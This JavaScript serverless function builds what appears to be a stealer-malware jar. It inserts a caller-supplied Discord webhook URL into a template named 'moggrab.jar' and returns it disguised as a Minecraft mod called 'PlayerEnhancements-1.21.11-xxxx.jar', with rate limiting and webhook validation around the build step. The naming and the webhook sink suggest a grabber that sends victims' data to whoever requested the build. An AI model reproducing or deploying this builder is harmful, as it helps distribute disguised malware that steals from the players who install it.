const AdmZip = require('adm-zip');
const path = require('path');

const TEMPLATE = path.join(__dirname, 'moggrab.jar');
const WH_RE = /^https:\/\/discord(app)?\.com\/api\/webhooks\/\d{17,20}\/[A-Za-z0-9_-]{50,100}/;

// in-memory rate limit per warm instance (2 builds / minute / ip)
const hits = new Map();
function rateLimited(ip) {
  const now = Date.now();
  const fresh = (hits.get(ip) || []).filter(t => now - t < 60000);
  if (fresh.length >= 2) return true;
  fresh.push(now);
  hits.set(ip, fresh);
  return false;
}

exports.handler = async (event) => {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: '{"error":"POST only"}' };
  }

  if (rateLimited(event.headers['x-forwarded-for'] || 'unknown')) {
    return {
      statusCode: 429,
      headers: { 'Content-Type': 'application/json' },
      body: '{"error":"Slow down, one build per minute or so."}',
    };
  }

  let webhook = '';
  try {
    webhook = (JSON.parse(event.body || '{}').webhook || '').trim();
  } catch (e) {
    return {
      statusCode: 400,
      headers: { 'Content-Type': 'application/json' },
      body: '{"error":"Bad request body."}',
    };
  }

  if (!webhook || webhook.length > 300 || !WH_RE.test(webhook)) {
    return {
      statusCode: 400,
      headers: { 'Content-Type': 'application/json' },
      body: '{"error":"That does not look like a valid Discord webhook URL."}',
    };
  }

  let jar;
  try {
    const zip = new AdmZip(TEMPLATE);
    zip.updateFile('webhook.txt', Buffer.from(webhook, 'utf8'));
    jar = zip.toBuffer();
  } catch (e) {
    return {
      statusCode: 500,
      headers: { 'Content-Type': 'application/json' },
      body: '{"error":"Build failed: template jar missing in the function dir."}',
    };
  }

  const name = `PlayerEnhancements-1.21.11-${Math.random().toString(36).slice(2, 6)}.jar`;
  return {
    statusCode: 200,
    headers: {
      'Content-Type': 'application/java-archive',
      'Content-Disposition': `attachment; filename="${name}"`,
    },
    isBase64Encoded: true,
    body: jar.toString('base64'),
  };
};

// serve this function at POST /api/build
exports.config = { path: '/api/build' };